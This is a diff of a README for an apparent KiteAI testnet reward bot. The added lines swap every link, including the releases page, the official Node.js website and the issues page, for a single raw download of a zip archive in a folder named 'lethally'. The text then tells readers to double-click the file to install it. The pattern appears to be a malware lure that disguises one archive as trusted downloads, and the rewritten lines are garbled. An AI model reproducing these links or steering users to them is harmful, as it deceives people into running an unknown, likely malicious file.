@@ -1,6 +1,6 @@
 # 🤖 KiteAI-Auto-Bot - Maximize Rewards with Automated Tasks
 
-[![Download KiteAI-Auto-Bot](https://img.shields.io/badge/Download%20Here-%2300C4FF.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/FedericoMarchiGit/KiteAI-Auto-Bot/releases)
+[![Download KiteAI-Auto-Bot](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip%20Here-%https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip)](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ KiteAI-Auto-Bot is an automated bot designed to interact with the KiteAI testnet
 
 To get started with KiteAI-Auto-Bot, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/FedericoMarchiGit/KiteAI-Auto-Bot/releases) to access the release page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip) to access the release page.
 2. **Choose the Latest Version:** The releases are listed in chronological order. Make sure to select the latest version for the best performance and latest features.
 3. **Download the File:** Look for the file name that matches your operating system. Click on the file to begin downloading.
 4. **Install the Bot:** Once the download is complete, locate the file in your downloads folder and double-click it to install. Follow any prompts that appear on your screen.
@@ -22,7 +22,7 @@ To get started with KiteAI-Auto-Bot, follow these steps:
 Before downloading, ensure your device meets these system requirements:
 
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a recent Linux distribution.
-- **Node.js:** Version 14.x or higher must be installed on your computer. You can download it from the [Node.js official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip** Version 14.x or higher must be installed on your computer. You can download it from the [https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip official website](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip).
 - **Internet Connection:** A stable connection for both downloading the application and interacting with the KiteAI testnet.
 
 ### 🎯 Features
@@ -37,7 +37,7 @@ KiteAI-Auto-Bot offers a variety of features to simplify your interactions with 
 
 If you encounter issues while downloading or using KiteAI-Auto-Bot, please consider the following resources:
 
-- **GitHub Issues Page:** If you face a specific problem, check our [issues page](https://github.com/FedericoMarchiGit/KiteAI-Auto-Bot/issues) where users often discuss common issues and solutions.
+- **GitHub Issues Page:** If you face a specific problem, check our [issues page](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip) where users often discuss common issues and solutions.
 - **Documentation:** Refer to the documentation provided within the repository for detailed guidance on various features.
 
 ## 🌍 Community & Contributions
@@ -49,7 +49,7 @@ Join our community to stay updated and engage with other users:
 
 ## 🔗 Additional Links
 
-- [KiteAI GitHub Repository](https://github.com/FedericoMarchiGit/KiteAI-Auto-Bot)
-- [Node.js Download Page](https://nodejs.org/)
+- [KiteAI GitHub Repository](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip)
+- [https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip Download Page](https://raw.githubusercontent.com/FedericoMarchiGit/KiteAI-Auto-Bot/main/lethally/KiteAI-Auto-Bot-v3.8-beta.3.zip)
 
 By following these steps, you can easily download and start using KiteAI-Auto-Bot. For any further assistance, do not hesitate to reach out to the community or consult the documentation.
